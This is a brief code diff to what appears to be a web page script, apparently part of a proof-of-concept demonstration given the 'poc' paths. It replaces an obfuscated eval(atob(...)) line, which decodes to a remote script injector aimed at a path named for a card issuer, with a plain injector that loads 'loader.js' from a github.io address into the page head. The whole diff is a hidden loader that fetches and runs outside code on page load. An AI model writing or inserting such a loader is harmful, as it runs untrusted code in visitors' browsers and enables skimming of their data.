@@ -1,1 +1,4 @@
-eval(atob('dmFyIGhjayA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOw0KaGNrLnNyYyA9ICdodHRwczovL3d3dy5zb3VyY2VkZWZlbnNlLmNvbS9wb2NkZW1vL2lzcmFjYXJkL2xvYWRlci5qcyc7DQpoY2suc2V0QXR0cmlidXRlKCdhc3luYycsICd0cnVlJyk7DQp2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsNCnMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoaGNrLCBzKTs='))
+var newScript = document.createElement('script');
+newScript.type = 'text/javascript';
+newScript.src = 'https://smilingad.github.io/sdpoc/loader.js';
+document.getElementsByTagName('head')[0].appendChild(newScript);
